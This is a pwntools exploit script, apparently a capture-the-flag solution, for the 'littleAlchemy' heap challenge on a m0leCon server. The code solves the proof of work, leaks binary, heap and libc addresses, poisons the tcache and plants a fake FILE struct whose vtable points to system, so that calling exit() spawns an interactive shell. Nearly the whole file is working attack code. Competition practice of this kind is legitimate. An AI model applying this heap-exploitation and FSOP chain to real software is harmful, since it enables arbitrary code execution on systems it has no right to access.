#!/usr/bin/python3
from pwn import *
import sys
from hashlib import sha256

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "littleAlchemy"
#"""
HOST = "challs.m0lecon.it"
PORT = 2123 
"""
HOST = "localhost"
PORT = 7777
#"""
if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
off_got_strlen = elf.symbols["strlen"]

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
off_unsorted = libc.symbols["__malloc_hook"] + 0x70
off_system = libc.symbols["system"]
off_io_list = libc.symbols["_IO_list_all"]
off_vtable = libc.symbols["_IO_file_jumps"]

# from distributed proof of work
def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

# commands
def create(idx, e1, e2):
	conn.recvuntil("Exit\n")
	conn.sendlineafter(">", "1")
	conn.sendlineafter(": ", str(idx))
	conn.sendlineafter(": ", str(e1))
	conn.sendlineafter(": ", str(e2))

def show_one(idx):
	conn.recvuntil("Exit\n")
	conn.sendlineafter(">", "2")
	conn.sendlineafter(": ", str(idx))

def show_all(idx):
	conn.recvuntil("Exit\n")
	conn.sendlineafter(">", "3")
	conn.sendlineafter(": ", str(idx))

def edit(idx, name):
	conn.recvuntil("Exit\n")
	conn.sendlineafter(">", "4")
	conn.sendlineafter(": ", str(idx))
	conn.sendlineafter(": ", name)

def delete(idx):
	conn.recvuntil("Exit\n")
	conn.sendlineafter(">", "5")
	conn.sendlineafter(": ", str(idx))

def copy(src, dst):
	conn.recvuntil("Exit\n")
	conn.sendlineafter(">", "6")
	conn.sendlineafter(": ", str(src))
	conn.sendlineafter(": ", str(dst))

def end():
	conn.recvuntil("Exit\n")
	conn.sendlineafter(">", "7")

def get_x30_chk(idx):
	create(idx, -1 ,-1)

def get_x50_chk(idx):
	create(idx, -1 ,-2)

def exploit():
	solvepow(conn, 5)
	
	get_x30_chk(0)
	get_x30_chk(1)
	
	payload = b"A"*0x10
	payload += p64(0x131) # 0x31 -> 0x131
	for i in range(2, 9):
		get_x50_chk(i)
		edit(i-1, payload[:-1]) # overwrite size not to be reused
		get_x30_chk(i)
	get_x50_chk(2)
	get_x50_chk(3)
	get_x50_chk(4)
	get_x50_chk(5)
	
	# leak binary addres
	payload = b"0"*0x17+b"X"
	edit(4,payload)
	copy(4,0)
	show_one(0) 					# leak 
	conn.recvuntil("0X")
	bin_base = conn.recvline()[:-1] 
	bin_base = u64(bin_base+b'\x00'*(8-len(bin_base))) - 0x5d78
	got_strlen = bin_base + off_got_strlen
	
	# leak heap addres part
	copy(4,6)
	show_one(6)						# leak
	conn.recvuntil("0X") 			
	heap_base = conn.recvline()[:-1] 
	first_chunk = u64(heap_base+b'\x00'*(8-len(heap_base))) - 0x6d110 + 0x6cea0
	
	# link fake chunk to unsorted bin
	payload = b"A"*0x10
	payload += p64(0x451) 			# overwrite chunk size 0x31->0x451
	edit(0,payload[:-1])
	
	# leak libc address
	get_x50_chk(8)

	edit(4, "A"*0x17+"X")
	delete(1)						# linked to unsorted bin
	copy(4,0)
	show_one(0)						# leak address of unsorted bin in libc
	conn.recvuntil("AX")
	libc_unsorted = u64(conn.recvline()[:-1] + b'\x00\x00')
	libc_base = libc_unsorted - off_unsorted
	libc_system = libc_base + off_system
	libc_vtable = libc_base + off_vtable
	libc_io_list =libc_base + off_io_list
	
	# tcache poisoning
	payload = b"D"*0x60
	payload += p64(0x31)
	payload += p64(libc_vtable-0x10) # link [_IO_file_jumps-0x10] to tcache(0x30)
	
	edit(7, payload)
	
	get_x30_chk(2)
	get_x30_chk(3)
	
	payload = p64(libc_system)
	edit(3, payload)				# write libc_system at [_IO_file_jumps+8]
	
	payload = b"B"*0x68
	payload += p64(libc_io_list-0x18) 	# link [_IO_list_all-0x18] to tcache(0x50)
	edit(2, payload)				
	
	get_x50_chk(6)
	get_x50_chk(7)
	
	print(hex(libc_base))
	print(hex(bin_base))
	print(hex(first_chunk))
	
	edit(7, p64(first_chunk+0x30))  # write address of fake file struct to [_IO_list_all]
	
	# make fake file struct 
	fp = file_plus_struct()	 		# the function from original python module(kmpwn)
	fp._vtable = libc_vtable-0x10
	fp._flags = u64("/bin/sh\x00")
	fp._IO_write_ptr = 1			# to satisfy fp->write_ptr > fp->write_base
	fp._IO_write_base = 0
	payload = b"A"*0x8
	payload += fp.get_payload()
	edit(0, payload)				# make fake file struct on heap
	end()							# call exit()

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
